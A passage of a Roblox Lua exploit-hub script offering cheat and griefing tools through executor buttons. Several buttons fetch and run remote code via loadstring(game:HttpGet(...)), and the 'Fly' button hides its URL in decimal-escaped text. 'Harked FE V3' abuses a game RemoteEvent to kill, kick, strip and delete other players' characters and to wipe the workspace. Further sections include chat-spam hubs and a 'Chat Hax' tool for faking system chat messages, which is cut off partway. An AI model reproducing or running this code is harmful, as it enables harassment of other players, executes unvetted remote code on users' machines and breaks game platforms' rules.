                local track3 = lplayer.Character.Humanoid:LoadAnimation(Anim3)
                track3:Play(.1, 1, 1)
                bplrr = v.Name
                banpl = true
            end
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("uncarpet") then
            banpl = false
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("stare ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
                staring = true
                stareplr = v
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("unstare") then
            staring = false
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("logchat") then
            chatlogs = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "LogChat enabled";
            Text = "Now logging all player chat.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("unlogchat") then
            chatlogs = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "LogChat disabled";
            Text = "Stopped logging all player chat.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("fixcam") then
            game:GetService("Workspace").CurrentCamera:Destroy()
            wait(0.1)
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
            game:GetService("Workspace").CurrentCamera.CameraType = "Custom"
            lplayer.CameraMinZoomDistance = 0.5
            lplayer.CameraMaxZoomDistance = 400
            lplayer.CameraMode = "Classic"
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("unstate") then
            changingstate = false
        end
        CMDBAR.Text = ""
    end
end)
 
wait(0.3)
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Loaded successfully!";
    Text = "Reviz Admin V2 by illremember";
})
wait(0.1)
print("Reviz Admin V2 loaded!")
if game:GetService("Workspace").FilteringEnabled == true then
    warn("FE is Enabled (Filtering Enabled)")
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "FE is Enabled";
        Text = "Filtering Enabled. Enjoy using Reviz Admin!";
    })
else
    warn("FE is Disabled (Filtering Disabled) Consider using a different admin script.")
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "FE is Disabled";
        Text = "Filtering Disabled. Consider using a different admin script.";
    })
end
 
local intro = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
intro.Parent = game:GetService("CoreGui")
Frame.Parent = intro
Frame.BackgroundColor3 = Color3.new(1, 1, 1)
Frame.BackgroundTransparency = 1
Frame.Size = UDim2.new(1, 0, 0, 300)
Frame.Position = UDim2.new(0, 0, -0.4, 0)
ImageLabel.Parent = Frame
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.BackgroundTransparency = 1
ImageLabel.Position = UDim2.new(0, 0, 0, 0)
ImageLabel.Size = UDim2.new(1, 0, 1, 0)
ImageLabel.Image = "http://www.roblox.com/asset/?id=1542162618"
Frame:TweenPosition(UDim2.new(0, 0, 0.2, 0), "Out", "Elastic", 3)
wait(3.01)
Frame:TweenPosition(UDim2.new(0, 0, 1.5, 0), "Out", "Elastic", 5)
wait(5.01)
intro:Destroy()
end)
Tab3Section:NewButton("Chat Art", "Makes a Chat Art", function(CA)
loadstring(game:HttpGet("https://raw.githubusercontent.com/omegachadgaming/mongus/main/main.lua", true))()
end)
Tab3Section:NewButton("OOF Spam", "Spams the oof sound", function(OSS)
_G.enabled = true -- Re-execute to turn off
_G.speed = 110 -- Keep around 100 or it wont play

-- Variables
local RunService = game:GetService("RunService");
local Players = game:GetService("Players");
local LocalPlayer = game:GetService("Players").LocalPlayer;

local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait();
local Humanoid = Character:WaitForChild("Humanoid") or Character:FindFirstChildOfClass("Humanoid");
local HRP = Humanoid.RootPart or Humanoid:FindFirstChild("HumanoidRootPart")

-- Check
if not Humanoid or not _G.enabled then
   if Humanoid and Humanoid.Health <= 0 then
       Humanoid:Destroy()
   end
   return
end

-- Setting Up Humanoid
Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
Humanoid.BreakJointsOnDeath = false
Humanoid.RequiresNeck = false

local con; con = RunService.Stepped:Connect(function()
   if not Humanoid then return con:Disconnect() end
   Humanoid:ChangeState(Enum.HumanoidStateType.Running)  -- Change state so not die
end)

-- Infinite Death [literally 3 lines dont make it complicated]
LocalPlayer.Character = nil
LocalPlayer.Character = Character
task.wait(Players.RespawnTime + 0.1)

-- Looping Death
while task.wait(1/_G.speed) do
   Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
end
end)
Tab3Section:NewButton("Natural Disaster Script", "Opens NDS Script", function(NDS)
local DisasterHAX = Instance.new("ScreenGui")
local MainUI = Instance.new("Frame")
local name = Instance.new("TextLabel")
local creds = Instance.new("TextLabel")
local TPLobby = Instance.new("TextButton")

Crazy = Instance.new("TextButton")
local TPMap = Instance.new("TextButton")
local Walkspeed = Instance.new("TextButton")
local AFKWins = Instance.new("TextButton")
local Speedvalue = Instance.new("TextBox")
local Jumpower = Instance.new("TextButton")
local Jumpvalue = Instance.new("TextBox")
local Nofalldamage = Instance.new("TextButton")

-- Properties

DisasterHAX.Name = "DisasterHAX"
DisasterHAX.Parent = game.CoreGui

MainUI.Name = "MainUI"
MainUI.Parent = DisasterHAX
MainUI.BackgroundColor3 = Color3.new(0.435294, 0.435294, 0.435294)
MainUI.Position = UDim2.new(0.612644732, 0, 0.0489642099, 0)
MainUI.Size = UDim2.new(0, 344, 0, 408)

name.Name = "name"
name.Parent = MainUI
name.BackgroundColor3 = Color3.new(0.6, 0, 0.6)
name.Size = UDim2.new(0, 344, 0, 45)
name.Font = Enum.Font.SciFi
name.Text = "DisasterHax"
name.TextSize = 50

creds.Name = "creds"
creds.Parent = MainUI
creds.BackgroundColor3 = Color3.new(0.435294, 0.435294, 0.435294)
creds.BorderSizePixel = 0
creds.Position = UDim2.new(0, 0, 0.932153404, 0)
creds.Size = UDim2.new(0, 289, 0, 23)
creds.Font = Enum.Font.SciFi
creds.Text = "Made by Roboguyplayzroblox1"
creds.TextSize = 20

TPLobby.Name = "TPLobby"
TPLobby.Parent = MainUI
TPLobby.BackgroundColor3 = Color3.new(0.6, 0, 0.6)
TPLobby.Position = UDim2.new(0.0529100522, 0, 0.485391617, 0)
TPLobby.Size = UDim2.new(0, 145, 0, 42)
TPLobby.Font = Enum.Font.SciFi
TPLobby.Text = "Tp to lobby"
TPLobby.TextSize = 20
TPLobby.TextWrapped = true

Crazy.Name = "Crazy"
Crazy.Parent = MainUI
Crazy.BackgroundColor3 = Color3.new(0.6, 0, 0.6)
Crazy.Position = UDim2.new(0.518518567, 0, 0.485391617, 0)
Crazy.Size = UDim2.new(0, 145, 0, 42)
Crazy.Font = Enum.Font.SciFi
Crazy.Text = "Choose map"
Crazy.TextSize = 20
Crazy.TextWrapped = true

TPMap.Name = "TPMap"
TPMap.Parent = MainUI
TPMap.BackgroundColor3 = Color3.new(0.6, 0, 0.6)
TPMap.Position = UDim2.new(0.0529100895, 0, 0.63009721, 0)
TPMap.Size = UDim2.new(0, 145, 0, 42)
TPMap.Font = Enum.Font.SciFi
TPMap.Text = "Tp to map"
TPMap.TextSize = 20
TPMap.TextWrapped = true

Walkspeed.Name = "Walkspeed"
Walkspeed.Parent = MainUI
Walkspeed.BackgroundColor3 = Color3.new(0.6, 0, 0.6)
Walkspeed.Position = UDim2.new(0.0343915336, 0, 0.149574876, 0)
Walkspeed.Size = UDim2.new(0, 121, 0, 42)
Walkspeed.Font = Enum.Font.SciFi
Walkspeed.Text = "Walkspeed"
Walkspeed.TextSize = 20
Walkspeed.TextWrapped = true

AFKWins.Name = "AFKWins"
AFKWins.Parent = MainUI
AFKWins.BackgroundColor3 = Color3.new(0.6, 0, 0.6)
AFKWins.Position = UDim2.new(0.518257022, 0, 0.630314112, 0)
AFKWins.Size = UDim2.new(0, 145, 0, 42)
AFKWins.Font = Enum.Font.SciFi
AFKWins.Text = "Afk wins"
AFKWins.TextSize = 20
AFKWins.TextWrapped = true

Speedvalue.Name = "Speedvalue"
Speedvalue.Parent = MainUI
Speedvalue.BackgroundColor3 = Color3.new(0.6, 0, 0.6)
Speedvalue.Position = UDim2.new(0.386474103, 0, 0.149574876, 0)
Speedvalue.Size = UDim2.new(0, 129, 0, 42)
Speedvalue.Font = Enum.Font.SciFi
Speedvalue.Text = "Value"
Speedvalue.TextSize = 16

Jumpower.Name = "Jumpower"
Jumpower.Parent = MainUI
Jumpower.BackgroundColor3 = Color3.new(0.6, 0, 0.6)
Jumpower.Position = UDim2.new(0.0343915336, 0, 0.278437614, 0)
Jumpower.Size = UDim2.new(0, 121, 0, 42)
Jumpower.Font = Enum.Font.SciFi
Jumpower.Text = "Jumpower"
Jumpower.TextSize = 20
Jumpower.TextWrapped = true

Jumpvalue.Name = "Jumpvalue"
Jumpvalue.Parent = MainUI
Jumpvalue.BackgroundColor3 = Color3.new(0.6, 0, 0.6)
Jumpvalue.Position = UDim2.new(0.386474073, 0, 0.278437614, 0)
Jumpvalue.Size = UDim2.new(0, 129, 0, 42)
Jumpvalue.Font = Enum.Font.SciFi
Jumpvalue.Text = "Value"
Jumpvalue.TextSize = 16

Nofalldamage.Name = "Nofalldamage"
Nofalldamage.Parent = MainUI
Nofalldamage.BackgroundColor3 = Color3.new(0.6, 0, 0.6)
Nofalldamage.Position = UDim2.new(0.0618616641, 0, 0.765118003, 0)
Nofalldamage.Size = UDim2.new(0, 145, 0, 42)
Nofalldamage.Font = Enum.Font.SciFi
Nofalldamage.Text = "No fall damage"
Nofalldamage.TextSize = 20
Nofalldamage.TextWrapped = true

-- local
p = game.Players.LocalPlayer


-- draggable
MainUI.Active = true
MainUI.Draggable = true


-- Scripts 

Crazy.MouseButton1Click:connect(function()
local id = 1195159620
game:GetObjects('rbxassetid://'..id)[1].Parent=game.Players.LocalPlayer.PlayerGui

game.Players.LocalPlayer.PlayerGui.NDSMapSelector.Button.LeButton.Disabled = false
print("Select your map")
end)

AFKWins.MouseButton1Click:connect(function()
while true do
wait(5)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-290, 178, 379)
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end
end)

TPMap.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(106, 46, 3)
end)


TPLobby.MouseButton1Click:connect(function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-290, 178, 379)
end)

Walkspeed.MouseButton1Click:connect(function()
p.Character.Humanoid.WalkSpeed = Speedvalue.Text
end)

Jumpower.MouseButton1Click:connect(function()
p.Character.Humanoid.JumpPower = Jumpvalue.Text
end)


Nofalldamage.MouseButton1Click:connect(function()
while wait(0.01) do
a = Instance.new("Script", game.Players.LocalPlayer.Character)
a.Name = "CharacterScript"
wait(0.02)
game.Players.LocalPlayer.Character.CharacterScript:Destroy()
end
end)
end)
Tab3Section:NewButton("Work At A Pizza Place Script", "Opens the WAAPP script", function(WAAPPRBLX)
loadstring(game:HttpGet("https://gist.githubusercontent.com/TurkOyuncu99/bb2f1182a224999682a2d1a87aa8517a/raw/66c7791224be0434b23938ca26244238649d0143/ameicaa", true))()
end)
Tab3Section:NewButton("Harked FE V3", "Opens the Popular HFE V3", function(HFE3)
local main = Instance.new("ScreenGui")
local top = Instance.new("Frame")
local back = Instance.new("Frame")
local kill = Instance.new("TextButton")
local btools = Instance.new("TextButton")
local top_2 = Instance.new("TextLabel")
local naked = Instance.new("TextButton")
local credits = Instance.new("TextLabel")
local hatless = Instance.new("TextButton")
local sink = Instance.new("TextButton")
local nuke = Instance.new("TextButton")
local kick = Instance.new("TextButton")
local target = Instance.new("TextBox")
local queue = Instance.new("TextLabel")
local nolimbs = Instance.new("TextButton")
--Properties:
main.Name = "main"
main.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

top.Name = "top"
top.Parent = main
top.Draggable = true
top.Active = true
top.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
top.BackgroundTransparency = 0.30000001192093
top.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
top.Position = UDim2.new(0.612145662, 0, 0.311965823, 0)
top.Size = UDim2.new(0, 291, 0, 30)

back.Name = "back"
back.Parent = top
back.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
back.BackgroundTransparency = 0.30000001192093
back.BorderColor3 = Color3.new(0.117647, 0.117647, 0.117647)
back.BorderSizePixel = 0
back.Position = UDim2.new(-0.00343642617, 0, 1, 0)
back.Size = UDim2.new(0, 293, 0, 293)

kill.Name = "kill"
kill.Parent = top
kill.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
kill.BackgroundTransparency = 0.5
kill.BorderSizePixel = 0
kill.Position = UDim2.new(0.0206185561, 0, 1.76666665, 0)
kill.Size = UDim2.new(0, 134, 0, 40)
kill.Font = Enum.Font.SourceSansLight
kill.Text = "Kill"
kill.TextColor3 = Color3.new(1, 1, 1)
kill.TextSize = 23

btools.Name = "btools"
btools.Parent = top
btools.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
btools.BackgroundTransparency = 0.5
btools.BorderSizePixel = 0
btools.Position = UDim2.new(0.525773168, 0, 1.76666665, 0)
btools.Size = UDim2.new(0, 131, 0, 40)
btools.Font = Enum.Font.SourceSansLight
btools.Text = "Btools"
btools.TextColor3 = Color3.new(1, 1, 1)
btools.TextSize = 23

top_2.Name = "top"
top_2.Parent = top
top_2.BackgroundColor3 = Color3.new(1, 1, 1)
top_2.BackgroundTransparency = 1
top_2.Position = UDim2.new(0.154639184, 0, -0.333333343, 0)
top_2.Size = UDim2.new(0, 200, 0, 50)
top_2.Font = Enum.Font.SourceSansLight
top_2.Text = "Harked"
top_2.TextColor3 = Color3.new(1, 1, 1)
top_2.TextSize = 45

naked.Name = "naked"
naked.Parent = top
naked.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
naked.BackgroundTransparency = 0.5
naked.BorderSizePixel = 0
naked.Position = UDim2.new(0.0206185561, 0, 3.56217241, 0)
naked.Size = UDim2.new(0, 134, 0, 40)
naked.Font = Enum.Font.SourceSansLight
naked.Text = "Naked"
naked.TextColor3 = Color3.new(1, 1, 1)
naked.TextSize = 23

credits.Name = "credits"
credits.Parent = top
credits.BackgroundColor3 = Color3.new(1, 1, 1)
credits.BackgroundTransparency = 1
credits.Position = UDim2.new(0, 0, 1, 0)
credits.Size = UDim2.new(0, 291, 0, 23)
credits.Font = Enum.Font.SourceSansLight
credits.Text = "Commands/Scripts by Dong , UI by Unverified"
credits.TextColor3 = Color3.new(1, 1, 1)
credits.TextSize = 17
credits.TextWrapped = true

hatless.Name = "hatless"
hatless.Parent = top
hatless.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
hatless.BackgroundTransparency = 0.5
hatless.BorderSizePixel = 0
hatless.Position = UDim2.new(0.0206185561, 0, 5.39550591, 0)
hatless.Size = UDim2.new(0, 134, 0, 40)
hatless.Font = Enum.Font.SourceSansLight
hatless.Text = "Hatless"
hatless.TextColor3 = Color3.new(1, 1, 1)
hatless.TextSize = 23

sink.Name = "sink"
sink.Parent = top
sink.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
sink.BackgroundTransparency = 0.5
sink.BorderSizePixel = 0
sink.Position = UDim2.new(0.525773168, 0, 5.39550591, 0)
sink.Size = UDim2.new(0, 131, 0, 40)
sink.Font = Enum.Font.SourceSansLight
sink.Text = "Sink"
sink.TextColor3 = Color3.new(1, 1, 1)
sink.TextSize = 23

nuke.Name = "nuke"
nuke.Parent = top
nuke.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
nuke.BackgroundTransparency = 0.5
nuke.BorderSizePixel = 0
nuke.Position = UDim2.new(0.525773168, 0, 7.1955061, 0)
nuke.Size = UDim2.new(0, 131, 0, 40)
nuke.Font = Enum.Font.SourceSansLight
nuke.Text = "Nuke"
nuke.TextColor3 = Color3.new(1, 1, 1)
nuke.TextSize = 23

kick.Name = "kick"
kick.Parent = top
kick.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
kick.BackgroundTransparency = 0.5
kick.BorderSizePixel = 0
kick.Position = UDim2.new(0.0206185561, 0, 7.1955061, 0)
kick.Size = UDim2.new(0, 134, 0, 40)
kick.Font = Enum.Font.SourceSansLight
kick.Text = "Kick"
kick.TextColor3 = Color3.new(1, 1, 1)
kick.TextSize = 23

target.Name = "target"
target.Parent = top
target.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
target.BackgroundTransparency = 0.40000000596046
target.Position = UDim2.new(0.0206185561, 0, 8.86666584, 0)
target.Size = UDim2.new(0, 278, 0, 33)
target.Font = Enum.Font.SourceSans
target.Text = ""
target.TextColor3 = Color3.new(1, 1, 1)
target.TextSize = 23

queue.Name = "queue"
queue.Parent = top
queue.BackgroundColor3 = Color3.new(1, 1, 1)
queue.BackgroundTransparency = 1
queue.Position = UDim2.new(0.15463917, 0, 10.0333328, 0)
queue.Size = UDim2.new(0, 201, 0, 23)
queue.Font = Enum.Font.SourceSans
queue.Text = "Replication Queue: 0"
queue.TextColor3 = Color3.new(1, 0, 0.0156863)
queue.TextSize = 20
queue.TextWrapped = true

nolimbs.Name = "nolimbs"
nolimbs.Parent = top
nolimbs.BackgroundColor3 = Color3.new(0.67451, 0.67451, 0.67451)
nolimbs.BackgroundTransparency = 0.5
nolimbs.BorderSizePixel = 0
nolimbs.Position = UDim2.new(0.525773168, 0, 3.56217265, 0)
nolimbs.Size = UDim2.new(0, 131, 0, 40)
nolimbs.Font = Enum.Font.SourceSansLight
nolimbs.Text = "NoLimbs"
nolimbs.TextColor3 = Color3.new(1, 1, 1)
nolimbs.TextSize = 23

-- SLAVE'S WORK --

for i,slaves in pairs(game:GetDescendants()) do
    if slaves.Name == "DestroySegway" then
        print("no u")   
    
kill.MouseButton1Down:connect(function()
if string.lower(target.Text) == "all" then
	for i,c in pairs(game.Players:GetPlayers()) do
 		ohok = c.Character["Head"]
        slaves:FireServer(ohok, {Value = ohok})
	end	
	else
if game.Players:FindFirstChild(target.Text) then
if game.Players:FindFirstChild(target.Text).Character then
	slaves:FireServer(game.Players:FindFirstChild(target.Text).Character.Head, {Value = game.Players:FindFirstChild(target.Text).Character.Head}) else
		print("nibba who this")
	
end
	
	
end

end
end)

btools.MouseButton1Down:connect(function()
	local Tool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
local Equipped = false

Tool.RequiresHandle = false
Tool.Name = "Destroy Tool"
local Field = Instance.new("SelectionBox",game.Workspace)
local Mouse = game.Players.LocalPlayer:GetMouse()
Field.LineThickness = 0.1

Tool.Equipped:connect(function()
Equipped = true

while Equipped == true do
if Mouse.Target ~= nil then
Field.Adornee = Mouse.Target

else
Field.Adornee = nil
end
wait()
end
end)


Tool.Unequipped:connect(function()
Equipped = false
Field.Adornee = nil
end)

Tool.Activated:connect(function()
if Mouse.Target ~= nil then
slaves:FireServer(Mouse.Target, {Value = Mouse.Target})	
local AttemptTarget = Mouse.Target
while AttemptTarget ~= nil do
AttemptTarget.Velocity = Vector3.new(0,-1000000000000000,0)
AttemptTarget.CanCollide = false
wait()
end

end
end)
end)

naked.MouseButton1Down:connect(function()
	if string.lower(target.Text) == "all" then
		for i,c in pairs(game.Players:GetPlayers()) do
    ohok = c.Character.Shirt
    ohoka = c.Character.Pants
    slaves:FireServer(ohok, {Value = ohok})
    slaves:FireServer(ohoka, {Value = ohoka})
		end
	else
		slaves:FireServer(game.Players:FindFirstChild(target.Text).Character.Shirt, {Value = game.Players:FindFirstChild(target.Text).Character.Shirt})
		slaves:FireServer(game.Players:FindFirstChild(target.Text).Character.Pants, {Value = game.Players:FindFirstChild(target.Text).Character.Pants})
end
end)

nolimbs.MouseButton1Down:connect(function()
	if string.lower(target.Text) == "all" then
		for i,c in pairs(game.Players:GetPlayers()) do
    ohok = c.Character["Right Arm"]
    ohoka = c.Character["Left Arm"]
    ohokb = c.Character["Right Leg"]
    ohokc = c.Character["Left Leg"]
        slaves:FireServer(ohok, {Value = ohok})
	slaves:FireServer(ohoka, {Value = ohoka})
        slaves:FireServer(ohokb, {Value = ohokb})
	slaves:FireServer(ohokc, {Value = ohokc})
		end
	else
		slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["Right Arm"], {Value = game.Players:FindFirstChild(target.Text).Character["Right Arm"]})
		slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["Right Leg"], {Value = game.Players:FindFirstChild(target.Text).Character["Right Leg"]})
		slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["Left Arm"], {Value = game.Players:FindFirstChild(target.Text).Character["Left Arm"]})
		slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["Left Leg"], {Value = game.Players:FindFirstChild(target.Text).Character["Left Leg"]})
	end
end)

hatless.MouseButton1Down:connect(function()
	if string.lower(target.Text) == "all" then
		for i,x in pairs(game.Players:GetPlayers()) do
    for i,c in pairs(x.Character:GetChildren()) do
    if c:IsA("Accessory") then
    ohok = c
    slaves:FireServer(ohok, {Value = ohok})
   
end
end
end
	else
		for i, hats in pairs(game.Players:FindFirstChild(target.Text).Character:GetChildren()) do
			if hats:IsA("Accessory") then
				slaves:FireServer(hats, {Value = hats })
			end
		end
end
end)

sink.MouseButton1Down:connect(function()
	if string.lower(target.Text) == "all" then
		for i,c in pairs(game.Players:GetPlayers()) do
    ohok = c.Character.HumanoidRootPart
    slaves:FireServer(ohok, {Value = ohok})
		end
	else
		slaves:FireServer(game.Players:FindFirstChild(target.Text).Character["HumanoidRootPart"], {Value = game.Players:FindFirstChild(target.Text).Character["HumanoidRootPart"]})
end
end)

kick.MouseButton1Down:connect(function()
	if string.lower(target.Text) == "all" then
		for i,c in pairs(game.Players:GetPlayers()) do
    ohok = c
        slaves:FireServer(ohok, {Value = ohok})
		end
	else
		slaves:FireServer(game.Players:FindFirstChild(target.Text), {Value = game.Players:FindFirstChild(target.Text)})
	end
end)

nuke.MouseButton1Down:connect(function()
	for i,c in pairs(game.Workspace:GetChildren()) do
    ohok = c
        slaves:FireServer(ohok, {Value = ohok})
end
end)

end
end
end)
Tab1Section:NewButton("Fly", "Lets you fly", function(FLY)
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
end)
Tab3Section:NewButton("SpamHub", "Gives you options to Spam Chat", function(SC)
loadstring(game:HttpGet(('https://raw.githubusercontent.com/ColdStep2/Chatdestroyer-Hub-V1/main/Chatdestroyer%20Hub%20V1'),true))()
end)
Tab3Section:NewButton("Chat Hax", "Let's you troll with chat hax", function(CHFE)
--[[

░█████╗░██╗░░██╗░█████╗░████████╗  ██╗░░██╗░█████╗░██╗░░██╗
██╔══██╗██║░░██║██╔══██╗╚══██╔══╝  ██║░░██║██╔══██╗╚██╗██╔╝
██║░░╚═╝███████║███████║░░░██║░░░  ███████║███████║░╚███╔╝░
██║░░██╗██╔══██║██╔══██║░░░██║░░░  ██╔══██║██╔══██║░██╔██╗░
╚█████╔╝██║░░██║██║░░██║░░░██║░░░  ██║░░██║██║░░██║██╔╝╚██╗
░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░  ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝
                                                  
-- Script Info --
TITLE: CHAT HAX [FE]
AUTHOR: SECURITY HACKER
SERVER-SIDED: Yes
EXECUTOR REQUIRED: Any
------------------

This script is from Security Hacker

]]

----- Configuration -----
local hotkey = "P" -- The message should be sent when the key is pressed
-------------------------

------------------------------------------------------
function MainExploit()
	local FakeMessageGUI = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local UICorner = Instance.new("UICorner")
	local Topbar = Instance.new("Frame")
	local UICorner_2 = Instance.new("UICorner")
	local TextLabel = Instance.new("TextLabel")
	local TextLabel2 = Instance.new("TextLabel")
	local usermessagef = Instance.new("Frame")
	local UICorner_5 = Instance.new("UICorner")
	local UMessage = Instance.new("TextBox")
	local TextLabel3 = Instance.new("TextLabel")
	local systemprefixf = Instance.new("Frame")
	local UICorner_6 = Instance.new("UICorner")
	local SPrefix = Instance.new("TextBox")
	local TextLabel4 = Instance.new("TextLabel")
	local systemmessagef = Instance.new("Frame")
	local UICorner_7 = Instance.new("UICorner")
	local SMessage = Instance.new("TextBox")
	local Send = Instance.new("TextButton")
	local UICorner_8 = Instance.new("UICorner")
	
	FakeMessageGUI.Name = "FakeMessageGUI"
	FakeMessageGUI.Parent = game.Players.LocalPlayer.PlayerGui
	FakeMessageGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	FakeMessageGUI.DisplayOrder = 10000
	FakeMessageGUI.ResetOnSpawn = false
	
	Frame.Parent = FakeMessageGUI
	Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Frame.BorderSizePixel = 0
	Frame.Position = UDim2.new(0.0237248112, 0, 0.685258985, 0)
	Frame.Size = UDim2.new(0.322657138, 0, 0.292828679, 0)
	
	UICorner.Parent = Frame
	
	Topbar.Name = "Topbar"
	Topbar.Parent = Frame
	Topbar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Topbar.BorderSizePixel = 0
	Topbar.Position = UDim2.new(0.0367646813, 0, 0.0408163257, 0)
	Topbar.Size = UDim2.new(0.93750006, 0, 0.163265303, 0)
	Topbar.ZIndex = 2
	
	UICorner_2.Parent = Topbar
	
	TextLabel.Parent = Topbar
	TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel.BackgroundTransparency = 1.000
	TextLabel.BorderSizePixel = 0
	TextLabel.Position = UDim2.new(0.054901965, 0, 0, 0)
	TextLabel.Size = UDim2.new(0.886274636, 0, 1, 0)
	TextLabel.Font = Enum.Font.GothamBlack
	TextLabel.Text = "Chat hax"
	TextLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
	TextLabel.TextScaled = true
	TextLabel.TextSize = 14.000
	TextLabel.TextWrapped = true
	
	
	TextLabel2.Name = "TextLabel2"
	TextLabel2.Parent = Frame
	TextLabel2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel2.BackgroundTransparency = 1.000
	TextLabel2.BorderSizePixel = 0
	TextLabel2.Position = UDim2.new(0.0330882557, 0, 0.278911561, 0)
	TextLabel2.Size = UDim2.new(0.352941185, 0, 0.108843535, 0)
	TextLabel2.Font = Enum.Font.ArialBold
	TextLabel2.Text = "Your Message: "
	TextLabel2.TextColor3 = Color3.fromRGB(0, 255, 0)
	TextLabel2.TextScaled = true
	TextLabel2.TextSize = 14.000
	TextLabel2.TextWrapped = true
	TextLabel2.TextXAlignment = Enum.TextXAlignment.Left
	
	usermessagef.Name = "usermessagef"
	usermessagef.Parent = Frame
	usermessagef.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	usermessagef.BorderSizePixel = 0
	usermessagef.Position = UDim2.new(0.386029392, 0, 0.278911561, 0)
	usermessagef.Size = UDim2.new(0.588235378, 0, 0.122448981, 0)
	
	UICorner_5.CornerRadius = UDim.new(0, 3)
	UICorner_5.Parent = usermessagef
	
	UMessage.Name = "UMessage"
	UMessage.Parent = usermessagef
	UMessage.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	UMessage.BackgroundTransparency = 1.000
	UMessage.BorderColor3 = Color3.fromRGB(27, 42, 53)
	UMessage.BorderSizePixel = 0
	UMessage.Position = UDim2.new(0.0437499993, 0, 0, 0)
	UMessage.Size = UDim2.new(0.906250179, 0, 0.888888896, 0)
	UMessage.Font = Enum.Font.SourceSans
	UMessage.PlaceholderColor3 = Color3.fromRGB(0, 255, 0)
	UMessage.PlaceholderText = ""
	UMessage.Text = ""
	UMessage.TextColor3 = Color3.fromRGB(0, 255, 0)
	UMessage.TextScaled = true
	UMessage.TextSize = 14.000
	UMessage.TextWrapped = true
	UMessage.TextXAlignment = Enum.TextXAlignment.Left
	
	TextLabel3.Name = "TextLabel3"
	TextLabel3.Parent = Frame
	TextLabel3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel3.BackgroundTransparency = 1.000
	TextLabel3.BorderSizePixel = 0
	TextLabel3.Position = UDim2.new(0.0294117853, 0, 0.442176878, 0)
	TextLabel3.Size = UDim2.new(0.352941185, 0, 0.108843535, 0)
	TextLabel3.Font = Enum.Font.ArialBold
	TextLabel3.Text = "Username"
	TextLabel3.TextColor3 = Color3.fromRGB(0, 255, 0)
	TextLabel3.TextScaled = true
	TextLabel3.TextSize = 14.000
	TextLabel3.TextWrapped = true
	TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
	
	systemprefixf.Name = "systemprefixf"
	systemprefixf.Parent = Frame
	systemprefixf.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	systemprefixf.BorderSizePixel = 0
	systemprefixf.Position = UDim2.new(0.386029392, 0, 0.442176878, 0)
	systemprefixf.Size = UDim2.new(0.588235378, 0, 0.122448981, 0)
	
	UICorner_6.CornerRadius = UDim.new(0, 3)
	UICorner_6.Parent = systemprefixf
	
